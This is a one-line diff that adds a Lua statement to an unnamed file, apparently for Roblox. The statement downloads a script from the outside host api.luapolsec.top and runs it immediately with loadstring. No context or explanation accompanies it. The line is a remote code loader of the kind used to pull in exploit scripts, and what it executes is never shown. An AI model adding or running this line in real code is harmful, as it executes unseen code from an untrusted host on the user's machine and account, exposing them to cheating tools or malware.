@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://api.luapolsec.top/files/v4/loaders/8d7614f7cc7344f38dac9701949b3a71.lua"))()
